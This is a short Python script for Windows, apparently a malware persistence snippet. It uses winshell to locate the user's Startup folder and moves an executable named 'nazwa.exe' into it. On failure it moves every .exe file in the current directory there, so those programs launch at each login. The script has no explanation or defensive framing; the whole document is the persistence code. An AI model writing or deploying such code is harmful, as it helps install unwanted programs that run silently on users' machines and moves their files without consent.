import os,shutil
import winshell

startup = winshell.startup()
p = os.path.abspath("") #+ os.path.basename(__file__)


if startup!=p:
    try:
        pass
        shutil.move(p+'\\'+"nazwa"+".exe",startup)
    except:
        onlyfiles = [f for f in os.listdir() if f.endswith(".exe")]
        for i in onlyfiles:
            shutil.move(p+'\\'+i,startup)

        